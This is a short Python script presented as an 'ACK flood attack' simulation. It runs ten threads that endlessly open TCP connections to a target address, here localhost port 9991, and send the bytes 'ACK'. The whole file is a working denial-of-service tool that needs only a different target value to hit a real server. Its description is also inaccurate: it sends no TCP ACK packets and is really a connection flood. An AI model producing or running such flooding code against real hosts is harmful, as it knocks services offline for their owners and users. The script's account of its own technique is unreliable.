import socket
import threading
import time

def ack_flood(target_ip, target_port):
    """
    Continuously sends ACK packets to the specified target IP and port to simulate an ACK flood attack.

    Args:
        target_ip (str): The IP address of the target server.
        target_port (int): The port number of the target server.
    """
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"ACK")
            sock.close()
            # Sleep for 0.1 seconds between each ACK packet
            time.sleep(0.1)
        except socket.error:
            pass

if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 9991
    for _ in range(10):
        thread = threading.Thread(target=ack_flood, args=(target_ip, target_port))
        thread.start()